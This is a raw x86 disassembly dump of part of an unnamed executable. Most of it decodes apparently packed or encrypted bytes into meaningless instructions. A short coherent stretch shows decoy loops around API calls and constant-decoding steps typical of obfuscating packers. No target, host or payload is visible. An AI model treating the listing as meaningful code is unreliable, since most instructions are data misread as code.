  407922:	fbld   TBYTE PTR [esi+0x5090e04e]
  407928:	mov    cl,cl
  40792a:	js     0x4078c7
  40792c:	xor    BYTE PTR [edx],bh
  40792e:	push   0x503bbce8
  407933:	fsubr  st(4),st
  407935:	jmp    0x7ff4b239
  40793a:	or     cl,ah
  40793c:	into   
  40793d:	xchg   ecx,eax
  40793e:	push   0x3c
  407940:	cmp    eax,0xfbf63dd0
  407945:	sub    eax,0xc1df2bad
  40794a:	ins    DWORD PTR es:[edi],dx
  40794b:	adc    eax,esi
  40794d:	and    eax,0xaca6f1b2
  407952:	call   0x3f2dcf36
  407957:	dec    esi
  407958:	pop    ebx
  407959:	jl     0x407928
  40795b:	call   0x93cb:0x429650f2
  407962:	mov    al,ds:0x97baac29
  407967:	xor    DWORD PTR [ebx+0x9],0xffffffc4
  40796b:	jmp    0x407946
  40796d:	dec    esi
  40796e:	inc    edx
  40796f:	and    eax,0xb7d4a5ea
  407974:	scas   al,BYTE PTR es:[edi]
  407975:	add    bh,dl
  407977:	pop    es
  407978:	and    esi,DWORD PTR [edx]
  40797a:	and    BYTE PTR [ecx-0x14],ah
  40797d:	pop    edx
  40797e:	fcomip st,st(1)
  407980:	mov    al,ds:0xc03f78
  407985:	xchg   ebx,eax
  407986:	in     al,dx
  407987:	leave  
  407988:	out    0xdf,al
  40798a:	neg    DWORD PTR [eax+edi*8+0x4d87a3d2]
  407991:	pop    esi
  407992:	push   DWORD PTR [eax-0x3a1eb0fe]
  407998:	lods   al,BYTE PTR ds:[esi]
  407999:	jle    0x407994
  40799b:	sbb    ah,BYTE PTR [ebx]
  40799d:	ins    BYTE PTR es:[edi],dx
  40799e:	sub    DWORD PTR [edx-0x38],edx
  4079a1:	xchg   esi,eax
  4079a2:	int3   
  4079a3:	sahf   
  4079a4:	je     0x407a00
  4079a6:	pop    esi
  4079a7:	sub    al,0xc3
  4079a9:	getsec 
  4079ab:	ficom  DWORD PTR [edi]
  4079ad:	jle    0x407a06
  4079af:	rcl    DWORD PTR [eax-0x28abaa40],cl
  4079b5:	movnti DWORD PTR [eax-0x25d82f70],esp
  4079bc:	cld    
  4079bd:	mov    dh,0xf3
  4079bf:	bound  edx,QWORD PTR [edx-0x4b6585b6]
  4079c5:	xchg   DWORD PTR [ebp+0x357f6530],ecx
  4079cb:	ror    BYTE PTR [eax-0x3a],0xed
  4079cf:	xchg   ebp,eax
  4079d0:	rcr    DWORD PTR [ebp-0x7c25aaad],cl
  4079d6:	ror    BYTE PTR [eax-0x6a6fbd94],cl
  4079dc:	dec    ecx
  4079dd:	fisubr WORD PTR [esi]
  4079df:	daa    
  4079e0:	jge    0x407a05
  4079e2:	dec    BYTE PTR [edi]
  4079e4:	mov    edi,DWORD PTR [ecx+0x58bee7c9]
  4079ea:	nop
  4079eb:	inc    edi
  4079ec:	(bad)  
  4079ed:	std    
  4079ee:	jge    0x407a3f
  4079f0:	mov    DWORD PTR [eax],ebp
  4079f2:	repz in al,0x99
  4079f5:	adc    al,0x36
  4079f7:	lock jb 0x4079a8
  4079fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079fb:	cmc    
  4079fc:	inc    ecx
  4079fd:	push   ebx
  4079fe:	sub    ebx,edi
  407a00:	push   eax
  407a01:	je     0x407995
  407a03:	mov    bh,0x1d
  407a05:	out    dx,eax
  407a06:	fcmovnu st,st(0)
  407a08:	jno    0x4079b7
  407a0a:	mov    esp,0x64112f6d
  407a0f:	imul   esi,DWORD PTR gs:[ecx+0x5ecad4b1],0xffffffed
  407a17:	fmulp  st(0),st
  407a19:	adc    ebx,DWORD PTR [edi+0x4aed9d9c]
  407a1f:	mov    ebx,0x195accb6
  407a24:	ins    BYTE PTR es:[edi],dx
  407a25:	not    DWORD PTR [ecx+0x35fc0e3d]
  407a2b:	push   DWORD PTR ds:0x43a38c
  407a31:	push   DWORD PTR ds:0x43a654
  407a37:	push   DWORD PTR [ebp-0x28]
  407a3a:	push   DWORD PTR [ebp-0x2c]
  407a3d:	mov    eax,DWORD PTR [ebp-0x14]
  407a40:	call   eax
  407a42:	mov    eax,DWORD PTR [ebp-0x30]
  407a45:	mov    ecx,DWORD PTR ds:0x43a350
  407a4b:	add    DWORD PTR [eax],ecx
  407a4d:	pop    edi
  407a4e:	pop    esi
  407a4f:	leave  
  407a50:	ret    
  407a51:	push   ebp
  407a52:	mov    ebp,esp
  407a54:	sub    esp,0x18
  407a57:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  407a5e:	lea    eax,[ebp+0x14]
  407a61:	adc    DWORD PTR ds:0x43501c,ecx
  407a67:	mov    DWORD PTR [ebp-0x4],eax
  407a6a:	adc    ecx,edx
  407a6c:	push   esi
  407a6d:	xor    ecx,0x4b84
  407a73:	mov    esi,0xf89c8585
  407a78:	xor    DWORD PTR ds:0x438014,edx
  407a7e:	mov    DWORD PTR [ebp-0xc],esi
  407a81:	lea    eax,[ebp-0xc]
  407a84:	adc    edx,ecx
  407a86:	mov    DWORD PTR [ebp-0x14],eax
  407a89:	mov    DWORD PTR ds:0x436014,0x1f
  407a93:	cmp    DWORD PTR ds:0x436014,0x0
  407a9a:	je     0x407ae5
  407aa0:	cmp    DWORD PTR ds:0x436014,0x6
  407aa7:	jg     0x407ae5
  407aad:	jmp    0x407abd
  407ab2:	push   0x43a097
  407ab7:	call   DWORD PTR ds:0x43a8d0
  407abd:	cmp    DWORD PTR ds:0x436014,0x7
  407ac4:	jne    0x407ad5
  407aca:	mov    eax,ds:0x436014
  407acf:	dec    eax
  407ad0:	mov    ds:0x436014,eax
  407ad5:	mov    eax,ds:0x436014
  407ada:	dec    eax
  407adb:	mov    ds:0x436014,eax
  407ae0:	jmp    0x407a93
  407ae5:	mov    eax,DWORD PTR [ebp-0xc]
  407ae8:	mov    edx,DWORD PTR [ebp-0x14]
  407aeb:	mov    ecx,0x751089b
  407af0:	xor    eax,ecx
  407af2:	add    eax,0x3272e2
  407af7:	adc    DWORD PTR ds:0x435010,0x438000
  407b01:	mov    DWORD PTR [edx],eax
  407b03:	sub    DWORD PTR ds:0x437008,0x436000
  407b0d:	mov    eax,ds:0x43a14c
  407b12:	sbb    DWORD PTR ds:0x43500c,ebx
  407b18:	mov    edx,DWORD PTR [ebp-0x4]
  407b1b:	or     DWORD PTR ds:0x435010,0x2376
  407b25:	mov    eax,DWORD PTR [eax]
  407b27:	add    DWORD PTR ds:0x434010,0x435010
  407b31:	add    eax,DWORD PTR [edx]
  407b33:	push   edi
  407b34:	mov    DWORD PTR [ebp-0x8],eax
  407b37:	mov    edi,DWORD PTR [ebp+0x8]
  407b3a:	and    DWORD PTR ds:0x438004,0x0
  407b44:	xor    edx,edx
  407b46:	xor    edx,DWORD PTR ds:0x438004
  407b4c:	inc    edx
  407b4d:	mov    DWORD PTR ds:0x438004,edx
  407b53:	cmp    DWORD PTR ds:0x438004,0x20
  407b5a:	jle    0x407b7d
  407b60:	jmp    0x407b70
  407b65:	push   0x43a111
  407b6a:	call   DWORD PTR ds:0x43a8d4
  407b70:	cmp    DWORD PTR ds:0x438004,0x11
  407b77:	jb     0x407b44
  407b7d:	mov    eax,ds:0x43a2d4
  407b82:	mov    eax,DWORD PTR [eax+0x198]
  407b88:	adc    DWORD PTR ds:0x43501c,0x6968
  407b92:	xor    edi,ecx
  407b94:	mov    edx,0x3272e2
  407b99:	add    edi,edx
  407b9b:	mov    DWORD PTR ds:0x434028,0x7d8d
  407ba5:	cmp    DWORD PTR [eax],edi
  407ba7:	mov    DWORD PTR ds:0x43500c,0x2ed0
  407bb1:	je     0x407bd2
  407bb7:	mov    DWORD PTR ds:0x43401c,0x771b
  407bc1:	mov    eax,DWORD PTR [eax]
  407bc3:	mov    DWORD PTR ds:0x434028,0x1ca1
  407bcd:	jmp    0x40a3ac
  407bd2:	mov    eax,DWORD PTR [ebp+0x18]
  407bd5:	cmp    eax,esi
  407bd7:	jne    0x407bf1
  407bdd:	mov    DWORD PTR ds:0x437010,0x6440
  407be7:	push   0xf89c8584
  407bec:	jmp    0x40a39b
  407bf1:	mov    esi,DWORD PTR [ebp+0x18]
  407bf4:	mov    eax,0xf89c85bb
  407bf9:	cmp    esi,eax
  407bfb:	jne    0x40a38b
  407c01:	sub    eax,esi
  407c03:	mov    eax,DWORD PTR [ebp+0x10]
  407c06:	xor    eax,ecx
  407c08:	mov    DWORD PTR ds:0x437008,0x10
  407c12:	cmp    DWORD PTR ds:0x437008,0x0
  407c19:	je     0x407c4c
  407c1f:	cmp    DWORD PTR ds:0x437008,0x12
  407c26:	jl     0x407c4c
  407c2c:	jmp    0x407c3a
  407c31:	push   DWORD PTR [ebp-0x18]
  407c34:	call   DWORD PTR ds:0x43a8dc
  407c3a:	mov    esi,DWORD PTR ds:0x437008
  407c40:	dec    esi
  407c41:	mov    DWORD PTR ds:0x437008,esi
  407c47:	jmp    0x407c12
  407c4c:	add    eax,edx
  407c4e:	and    DWORD PTR ds:0x43501c,0x0
  407c58:	jmp    0x407c6c
  407c5d:	xor    esi,esi
  407c5f:	or     esi,DWORD PTR ds:0x43501c
  407c65:	inc    esi
  407c66:	mov    DWORD PTR ds:0x43501c,esi
  407c6c:	cmp    DWORD PTR ds:0x43501c,0x1f
  407c73:	jae    0x407cc0
  407c79:	cmp    DWORD PTR ds:0x43501c,0x12
  407c80:	jg     0x407cc0
  407c86:	jmp    0x407ca1
  407c8b:	push   0x43a0c9
  407c90:	push   0x779d
  407c95:	push   DWORD PTR [ebp-0x18]
  407c98:	push   DWORD PTR [ebp-0x18]
  407c9b:	call   DWORD PTR ds:0x43a8e0
  407ca1:	cmp    DWORD PTR ds:0x43501c,0x11
  407ca8:	jne    0x407cbb
  407cae:	mov    esi,DWORD PTR ds:0x43501c
  407cb4:	inc    esi
  407cb5:	mov    DWORD PTR ds:0x43501c,esi
  407cbb:	jmp    0x407c5d
  407cc0:	mov    DWORD PTR [ebp-0x18],eax
  407cc3:	and    esi,esi
  407cc5:	mov    eax,DWORD PTR [ebp+0xc]
  407cc8:	mov    esi,DWORD PTR ds:0x437010
  407cce:	or     DWORD PTR ds:0x43600c,esi
  407cd4:	mov    esi,DWORD PTR [ebp-0x8]
  407cd7:	adc    DWORD PTR ds:0x43401c,0x438010
  407ce1:	xor    eax,ecx
  407ce3:	adc    DWORD PTR ds:0x435004,0x436008
  407ced:	add    eax,edx
  407cef:	xor    DWORD PTR ds:0x43501c,0x437018
  407cf9:	imul   eax,DWORD PTR [esi]
  407cfc:	mov    esi,DWORD PTR [ebp+0x8]
  407cff:	and    DWORD PTR ds:0x43700c,0x3cde
  407d09:	xor    esi,ecx
  407d0b:	sbb    DWORD PTR ds:0x437000,0x2ed1
  407d15:	add    esi,edx
  407d17:	mov    DWORD PTR ds:0x436004,0x2911
  407d21:	cmp    esi,eax
  407d23:	mov    eax,DWORD PTR [ebp-0x4]
  407d26:	mov    DWORD PTR ds:0x43501c,0x4044
  407d30:	push   ebx
  407d31:	mov    DWORD PTR ds:0x43600c,0x6dfa
  407d3b:	je     0x407e07
  407d41:	mov    DWORD PTR ds:0x435018,0x18
  407d4b:	cmp    DWORD PTR ds:0x435018,0x0
  407d52:	je     0x407db4
  407d58:	cmp    DWORD PTR ds:0x435018,0x8
  407d5f:	jb     0x407db4
  407d65:	jmp    0x407d88
  407d6a:	push   0x2a76
  407d6f:	push   0x436018
  407d74:	push   DWORD PTR [ebp-0xc]
  407d77:	push   0x43a01f
  407d7c:	push   DWORD PTR [ebp-0x24]
  407d7f:	push   DWORD PTR [ebp-0x24]
  407d82:	call   DWORD PTR ds:0x43a8e4
  407d88:	cmp    DWORD PTR ds:0x435018,0x9
  407d8f:	jne    0x407da2
  407d95:	mov    esi,DWORD PTR ds:0x435018
  407d9b:	dec    esi
  407d9c:	mov    DWORD PTR ds:0x435018,esi
  407da2:	mov    esi,DWORD PTR ds:0x435018
  407da8:	dec    esi
  407da9:	mov    DWORD PTR ds:0x435018,esi
  407daf:	jmp    0x407d4b
  407db4:	mov    esi,DWORD PTR [ebp-0x18]
  407db7:	add    DWORD PTR [eax],esi
  407db9:	mov    eax,DWORD PTR [ebp-0x4]
  407dbc:	mov    esi,DWORD PTR ds:0x43700c
  407dc2:	xor    esi,DWORD PTR ds:0x434008
  407dc8:	mov    DWORD PTR ds:0x43700c,esi
  407dce:	mov    esi,DWORD PTR [ebp+0xc]
  407dd1:	and    DWORD PTR ds:0x436010,0x434018
  407ddb:	xor    esi,ecx
  407ddd:	add    DWORD PTR ds:0x435018,0x43600c
  407de7:	add    esi,edx
  407de9:	xor    DWORD PTR ds:0x437014,0x43801c
  407df3:	imul   esi,DWORD PTR [eax]
  407df6:	mov    DWORD PTR ds:0x436018,0x6d68
  407e00:	mov    DWORD PTR [eax],esi
  407e02:	jmp    0x407e77
  407e07:	mov    DWORD PTR ds:0x435014,0x11
  407e11:	cmp    DWORD PTR ds:0x435014,0x0
  407e18:	je     0x407e72
  407e1e:	cmp    DWORD PTR ds:0x435014,0x6
  407e25:	ja     0x407e72
  407e2b:	jmp    0x407e46
  407e30:	push   DWORD PTR [ebp-0xc]
  407e33:	push   0x2134
  407e38:	push   DWORD PTR [ebp-0x24]
  407e3b:	push   0x8f99
  407e40:	call   DWORD PTR ds:0x43a8e8
  407e46:	cmp    DWORD PTR ds:0x435014,0x7
  407e4d:	jne    0x407e60
  407e53:	mov    ebx,DWORD PTR ds:0x435014
  407e59:	dec    ebx
  407e5a:	mov    DWORD PTR ds:0x435014,ebx
  407e60:	mov    ebx,DWORD PTR ds:0x435014
  407e66:	dec    ebx
  407e67:	mov    DWORD PTR ds:0x435014,ebx
  407e6d:	jmp    0x407e11
  407e72:	mov    esi,DWORD PTR [ebp+0x14]
  407e75:	xor    DWORD PTR [eax],esi
  407e77:	mov    eax,DWORD PTR [ebp-0x4]
  407e7a:	mov    edi,DWORD PTR [ebp+0x10]
  407e7d:	xor    edi,ecx
  407e7f:	mov    esi,0xffcd8d1e
  407e84:	mov    ebx,esi
  407e86:	sub    ebx,edi
  407e88:	add    DWORD PTR [eax],ebx
  407e8a:	mov    eax,DWORD PTR [ebp-0x4]
  407e8d:	mov    edi,DWORD PTR [ebp-0x8]
  407e90:	add    edi,DWORD PTR [eax]
  407e92:	mov    DWORD PTR [ebp-0x8],edi
  407e95:	mov    eax,DWORD PTR [ebp+0xc]
  407e98:	mov    edi,DWORD PTR [ebp+0xc]
  407e9b:	xor    edi,ecx
  407e9d:	xor    eax,ecx
  407e9f:	jmp    0x40a259
  407ea4:	lahf   
  407ea5:	(bad)  
  407ea6:	xchg   esp,eax
  407ea7:	jle    0x407e3d
  407ea9:	emms   
  407eab:	xchg   DWORD PTR [edi],ebp
  407ead:	jmp    0xc7a2:0xed2bc670
  407eb4:	test   eax,0xd17c7c3a
  407eb9:	pop    edi
  407eba:	jl     0x407f38
  407ebc:	stc    
  407ebd:	(bad)  
  407ebe:	icebp  
  407ebf:	add    edi,DWORD PTR [edi]
  407ec1:	cmp    BYTE PTR [esi],0x1d
  407ec4:	or     dh,BYTE PTR [esi]
  407ec6:	and    bh,BYTE PTR [ecx-0x7d76e6b]
  407ecc:	jp     0x407e92
  407ece:	outs   dx,BYTE PTR ds:[esi]
  407ecf:	cmp    BYTE PTR [esi-0x4d],bh
  407ed2:	mov    cl,0x8f
  407ed4:	xor    DWORD PTR [esi+ebp*8-0x3419c05e],ebp
  407edb:	dec    edi
  407edc:	lahf   
  407edd:	stos   DWORD PTR es:[edi],eax
  407ede:	and    ecx,DWORD PTR [edi+0x7e]
  407ee1:	xchg   esp,eax
  407ee2:	jno    0x407e9c
  407ee4:	fimul  WORD PTR [edi]
  407ee6:	push   edx
  407ee7:	add    BYTE PTR [edx],0xc9
  407eea:	mov    eax,ds:0x23d88b80
  407eef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ef0:	fs in  eax,0x96
  407ef3:	fs icebp 
  407ef5:	inc    ecx
  407ef6:	sbb    eax,DWORD PTR [eax-0x141988f1]
  407efc:	xchg   edi,eax
  407efd:	sahf   
  407efe:	in     al,dx
  407eff:	lds    esp,FWORD PTR [eax-0x3]
  407f02:	dec    eax
  407f03:	in     eax,dx
  407f04:	or     eax,0x55898ac2
  407f09:	xor    esi,DWORD PTR [eax-0x35]
  407f0c:	arpl   WORD PTR [esi-0xfba39a4],bp
  407f12:	data16 loopne 0x407f44
  407f15:	adc    BYTE PTR [eax-0x59],dl
  407f18:	xor    al,0x12
  407f1a:	mov    es,WORD PTR ds:0x4955585e
  407f20:	ret    0x7454
  407f23:	pop    edi
  407f24:	in     al,0x44
  407f26:	push   ebp
  407f27:	sub    dl,BYTE PTR [ebp-0x57]
  407f2a:	test   eax,0xfcbdce35
  407f2f:	js     0x407f72
  407f31:	daa    
  407f32:	jg     0x407f9d
  407f34:	or     ecx,DWORD PTR [edx-0x795b37d]
  407f3a:	fisub  DWORD PTR [ebp-0x639af132]
  407f40:	data16 in al,0xe4
  407f43:	cmp    eax,0x21cab51
  407f48:	test   edx,edx
  407f4a:	mov    ecx,0xe9e6925d
  407f4f:	pop    esp
  407f50:	cmp    bl,bh
  407f52:	aaa    
  407f53:	in     eax,0xff
  407f55:	lock cmc 
  407f57:	or     esi,esi
  407f59:	cmp    eax,0xbefaeea6
  407f5e:	adc    BYTE PTR [ebx-0x149e1eb5],bh
  407f64:	dec    edx
  407f65:	dec    ebx
  407f66:	push   eax
  407f67:	fdivr  DWORD PTR [bx+di-0x5b]
  407f6b:	lahf   
  407f6c:	push   0xffffff92
  407f6e:	iret   
  407f6f:	sbb    ah,al
  407f71:	xchg   ebx,eax
  407f72:	cli    
  407f73:	cmp    al,0xee
  407f75:	push   cs
  407f76:	lock mov ch,0xab
  407f79:	out    0xac,eax
  407f7b:	hlt    
  407f7c:	aad    0x60
  407f7e:	add    ecx,DWORD PTR [ebx]
  407f80:	add    eax,0xf2422be7
  407f85:	add    ah,BYTE PTR [esi-0x72]
  407f88:	cmp    ch,bl
  407f8a:	aas    
  407f8b:	push   edi
  407f8c:	push   ss
  407f8d:	mov    edi,DWORD PTR [edi-0x605d265e]
  407f93:	lods   eax,DWORD PTR ds:[esi]
  407f94:	add    al,0xb3
  407f96:	push   edi
  407f97:	jge    0x407fb1
  407f99:	xchg   edx,eax
  407f9a:	nop
  407f9b:	sub    eax,0x500e242f
  407fa0:	sti    
  407fa1:	test   eax,0x7922536b
  407fa6:	dec    ebp
  407fa7:	xchg   esi,eax
  407fa8:	mov    eax,ds:0x657a29b9
  407fad:	es sahf 
  407faf:	or     cl,BYTE PTR [ebx+0x14]
  407fb2:	sub    bl,BYTE PTR [esi+0x4d]
  407fb5:	icebp  
  407fb6:	jmp    0xdb7c:0xf3b52412
  407fbd:	add    eax,0x84e1aaf8
  407fc2:	and    ebx,ebx
  407fc4:	mov    dl,0x48
  407fc6:	push   edx
  407fc7:	cmp    eax,DWORD PTR [eax+0x79f25317]
  407fcd:	outs   dx,BYTE PTR ds:[esi]
  407fce:	or     bh,ah
  407fd0:	ins    BYTE PTR es:[edi],dx
  407fd1:	loopne 0x407f8c
  407fd3:	mov    al,0x5
  407fd5:	add    eax,0x26e553c
  407fda:	xor    BYTE PTR [ebp-0x39],bh
  407fdd:	jo     0x407ff2
  407fdf:	std    
  407fe0:	out    0x1e,eax
  407fe2:	pop    ss
  407fe3:	dec    ecx
  407fe4:	or     al,0xf1
  407fe6:	mov    ebp,0x905e8ffa
  407feb:	pop    ebx
  407fec:	inc    ebp
  407fed:	sub    al,0x6a
  407fef:	mov    ah,0xe3
  407ff1:	cmp    edx,ebx
  407ff3:	pop    DWORD PTR [ecx-0x171cfc01]
  407ff9:	hlt    
  407ffa:	imul   ecx,DWORD PTR [ebx],0xaf4d3006
  408000:	xor    DWORD PTR [ebx+0x4c],ebp
  408003:	jmp    DWORD PTR [eax+edi*1-0x1f64f3f8]
  40800a:	loope  0x408082
  40800c:	cmpps  xmm3,XMMWORD PTR [ecx+ebp*1],0xfc
  408011:	retf   0x8fcc
  408014:	out    0xf7,al
  408016:	inc    cx
  408018:	jg     0x407f9d
  40801a:	pushf  
  40801b:	sub    DWORD PTR [esi+esi*2],esp
  40801e:	dec    esp
  40801f:	jmp    0xc638:0xb9dac1f6
  408026:	pop    ecx
  408027:	fcom   QWORD PTR ds:0xd3baaee3
  40802d:	(bad)  
  40802e:	mov    ecx,0x8c97636
  408033:	data16 int 0x47
  408036:	mov    cl,0x9a
  408038:	ret    0x9c54
  40803b:	cmp    bh,BYTE PTR [edi+0x55cbb4f0]
  408041:	cdq    
  408042:	std    
  408043:	repnz mov esi,0xaa724dee
  408049:	mov    WORD PTR [edx-0x21f73ce3],ss
  40804f:	dec    ebx
  408050:	cmp    BYTE PTR [ebp+ebp*1-0x11],dh
  408054:	push   ecx
  408055:	(bad)  
  408056:	call   0x15491adf
  40805b:	dec    ebp
  40805c:	fimul  WORD PTR [ebp-0x217841b4]
  408062:	adc    DWORD PTR [ebp+0x76c21771],eax
  408068:	enter  0x47a3,0x52
  40806c:	adc    ch,BYTE PTR [ebx-0x59]
  40806f:	jno    0x4080b7
  408071:	push   esp
  408072:	pop    edx
  408073:	call   0xb34c:0x91e53211
  40807a:	aad    0x77
  40807c:	imul   ecx,DWORD PTR [ebx+0x4d3fd6ee],0xffffffdc
  408083:	mov    BYTE PTR [edi],ch
  408085:	sbb    BYTE PTR [ebp+0x47],dl
  408088:	shr    BYTE PTR [ebp+eax*2+0x14],0xb1
  40808d:	daa    
  40808e:	outs   dx,DWORD PTR ds:[esi]
  40808f:	enter  0x5f8e,0xd4
  408093:	sbb    eax,0x38060fe8
  408098:	lods   eax,DWORD PTR ds:[esi]
  408099:	cmp    BYTE PTR ds:0x60eea5aa,dh
  40809f:	ror    BYTE PTR [ebx],0xa0
  4080a2:	xchg   ecx,eax
  4080a3:	popf   
  4080a4:	adc    eax,0x118ab3e3
  4080a9:	jge    0x4080c9
  4080ab:	mov    esi,0x593c77d7
  4080b0:	push   es
  4080b1:	cmp    al,0x5f
  4080b3:	adc    eax,0xc4e341e7
  4080b8:	aas    
  4080b9:	fmul   DWORD PTR [edx+0x749ca545]
  4080bf:	lds    eax,FWORD PTR [ebx]
  4080c1:	in     eax,0x5d
  4080c3:	sub    DWORD PTR [esi+0x8],ebx
  4080c6:	jns    0x408058
  4080c8:	cmp    BYTE PTR [ecx+0x2d9d75ef],al
  4080ce:	fwait
  4080cf:	mov    cl,0xc5
  4080d1:	ret    0x51b7
  4080d4:	pop    ebx
  4080d5:	cdq    
  4080d6:	cwde   
  4080d7:	(bad)  
  4080d8:	mov    cs,ebp
  4080da:	xchg   DWORD PTR [ecx+0x62fa222e],edi
  4080e0:	pop    esp
  4080e1:	xchg   al,bl
  4080e3:	in     eax,dx
  4080e4:	sbb    cl,0x16
  4080e7:	and    eax,0xf7ff8c02
  4080ec:	bound  ebp,QWORD PTR [ecx+0x6a]
  4080ef:	std    
  4080f0:	cli    
  4080f1:	cmp    BYTE PTR [ebx+ebp*4-0x38202eae],ch
  4080f8:	sub    eax,0x8415593
  4080fd:	inc    edx
  4080fe:	cwde   
  4080ff:	aam    0x87
  408101:	jbe    0x4080a7
  408103:	in     eax,0x50
  408105:	(bad)  
  408106:	pop    edx
  408107:	std    
  408108:	mov    eax,ds:0x41407712
  40810d:	fwait
  40810e:	sbb    eax,0xd44e9ff5
  408113:	cld    
  408114:	push   ecx
  408115:	xchg   esi,eax
  408116:	popf   
  408117:	mov    edi,0xa949f7fc
  40811c:	sub    eax,0xdada9dd
  408121:	inc    ebx
  408122:	rcr    BYTE PTR [ebp-0x35],1
  408125:	stos   DWORD PTR es:[edi],eax
  408126:	push   0xffffffcb
  408128:	fs xchg ebx,eax
  40812a:	daa    
  40812b:	in     eax,dx
  40812c:	ins    DWORD PTR es:[edi],dx
  40812d:	ins    DWORD PTR es:[edi],dx
  40812e:	data16 cli 
  408130:	mov    dl,0x57
  408132:	ins    BYTE PTR es:[edi],dx
  408133:	mov    ebp,DWORD PTR [ecx-0x3c]
  408136:	arpl   WORD PTR [ebx+0x70],si
  408139:	jecxz  0x4081aa
  40813b:	sub    al,0x28
  40813d:	es dec ecx
  40813f:	sbb    esp,DWORD PTR [ecx+0x6f]
  408142:	mov    bh,0xca
  408144:	or     dh,BYTE PTR [edi]
  408146:	jecxz  0x40819e
  408148:	rcl    BYTE PTR [ecx-0x2c86c227],cl
  40814e:	js     0x408126
  408150:	push   esi
  408151:	mov    edx,0xc2855942
  408156:	adc    al,0xcf
  408158:	fdiv   QWORD PTR [esi-0x59]
  40815b:	loop   0x4081aa
  40815d:	and    cl,BYTE PTR [eax+0x7e]
  408160:	fwait
  408161:	mov    BYTE PTR [esi+0x6e],bl
  408164:	dec    edx
  408165:	pusha  
  408166:	sub    DWORD PTR [ebp-0x399cc94f],ebx
  40816c:	pop    eax
  40816d:	shl    BYTE PTR ss:[ebx+0x63174545],1
  408174:	inc    ebp
  408175:	mul    ah
  408177:	ret    0x600e
  40817a:	fwait
  40817b:	and    eax,0xbcff055
  408180:	push   ebp
  408181:	sbb    al,0x5c
  408183:	pusha  
  408184:	out    0x89,eax
  408186:	or     al,0x3c
  408188:	pop    ebx
  408189:	(bad)  
  40818a:	lea    esi,[edx]
  40818c:	mov    ecx,0xae64d821
  408191:	in     eax,0x60
  408193:	xchg   ebx,eax
  408194:	and    bl,BYTE PTR [eax]
  408196:	add    esp,DWORD PTR ds:0x43825f3
  40819c:	push   0x2
  40819e:	jge    0x408176
  4081a0:	pop    ecx
  4081a1:	dec    esi
  4081a2:	xor    eax,0xb9c15a63
  4081a7:	dec    esp
  4081a8:	and    DWORD PTR [edx-0x2e525f6a],edx
  4081ae:	sub    ebp,DWORD PTR [edi-0x55]
  4081b1:	sub    DWORD PTR [esi+0x5e4827c1],0xcdf9b04e
  4081bb:	adc    ah,ah
  4081bd:	into   
  4081be:	js     0x40823a
  4081c0:	retf   
  4081c1:	(bad)
  4081c4:	adc    al,0xce
  4081c6:	cmp    DWORD PTR [ebp-0x5],0x16
  4081ca:	sub    al,0xb7
  4081cc:	ja     0x408193
  4081ce:	loopne 0x40819b
  4081d0:	repz xlat BYTE PTR ds:[ebx]
  4081d2:	sub    DWORD PTR [eax-0x18],esp
  4081d5:	lods   eax,DWORD PTR ds:[esi]
  4081d6:	sahf   
  4081d7:	fist   WORD PTR [edi-0x2896df57]
  4081dd:	xchg   ebp,eax
  4081de:	repz pop eax
  4081e0:	jnp    0x408225
  4081e2:	sbb    BYTE PTR [ecx],ah
  4081e4:	fisub  WORD PTR [esp+ebp*8+0x22763ba0]
  4081eb:	or     ecx,DWORD PTR [ecx-0x1d]
  4081ee:	sbb    dl,BYTE PTR [ebx-0x70c80098]
  4081f4:	jae    0x4081a4
  4081f6:	arpl   WORD PTR [ebp-0x367cb46c],ax
  4081fc:	push   ecx
  4081fd:	retf   0x3fc7
  408200:	jg     0x4081ed
  408202:	not    DWORD PTR [eax-0x2b]
  408205:	(bad)  
  408207:	add    BYTE PTR [eax+0x126c906d],cl
  40820d:	pop    ss
  40820e:	outs   dx,DWORD PTR ds:[esi]
  40820f:	or     eax,0xbacdd6c2
  408214:	in     eax,0xcd
  408216:	xchg   al,cl
  408218:	jno    0x40828d
  40821a:	jmp    0x6c13d96b
  40821f:	adc    DWORD PTR [esi-0x14ae2c17],ecx
  408225:	shl    DWORD PTR [ecx],0x6b
  408228:	mov    ecx,0xed880034
  40822d:	inc    ebx
  40822e:	dec    eax
  40822f:	and    bh,dh
  408231:	jmp    0xd73b:0x21c08ce6
  408238:	je     0x408249
  40823a:	and    eax,0xa6261b84
  40823f:	int3   
  408240:	sub    al,0x70
  408242:	xchg   edi,eax
  408243:	mov    al,al
  408245:	mov    dh,0x74
  408247:	xor    BYTE PTR ds:[eax],0xe9
  40824b:	sahf   
  40824c:	sub    al,0x92
  40824e:	sub    edx,edx
  408250:	fdivr  DWORD PTR [ecx-0x1962ecd8]
  408256:	out    dx,al
  408257:	mov    ch,0xb5
  408259:	or     al,BYTE PTR [ebx-0x7c6efa1b]
  40825f:	pop    esi
  408260:	in     eax,dx
  408261:	mov    bh,0x1f
  408263:	jb     0x4082a5
  408265:	xchg   esp,eax
  408266:	pusha  
  408267:	shr    ebp,1
  408269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40826a:	enter  0xaa65,0x26
  40826e:	repz push es
  408270:	pop    ebx
  408271:	stc    
  408272:	ja     0x4081fb
  408274:	mov    dl,0x41
  408276:	pusha  
  408277:	aas    
  408278:	inc    edx
  408279:	cmp    al,BYTE PTR [ebp-0x64]
  40827c:	popf   
  40827d:	lea    eax,[edi]
  40827f:	pop    edi
  408280:	call   0x16a13978
  408285:	shl    BYTE PTR [ebp*8-0x4f80eb24],0x4d
  40828d:	add    edx,DWORD PTR ds:0xba5b8e4b
  408293:	xor    al,0x91
  408295:	test   ah,dl
  408297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408298:	out    dx,eax
  408299:	push   edi
  40829a:	mov    ds:0x18b2eeea,al
  40829f:	or     esi,edi
  4082a1:	push   0x6e
  4082a3:	pop    ds
  4082a4:	cmp    ebp,DWORD PTR [edi-0x3e]
  4082a7:	popa   
  4082a8:	hlt    
  4082a9:	cli    
  4082aa:	in     al,0x83
  4082ac:	cmp    eax,0xaba1295a
  4082b1:	enter  0xfa78,0xcf
  4082b5:	xlat   BYTE PTR ds:[ebx]
  4082b6:	push   ebp
  4082b7:	fist   WORD PTR [ecx+0x62f9dc31]
  4082bd:	and    edi,ebp
  4082bf:	outs   dx,BYTE PTR ds:[esi]
  4082c0:	call   0xbd06:0x3c3bcf52
  4082c7:	pop    eax
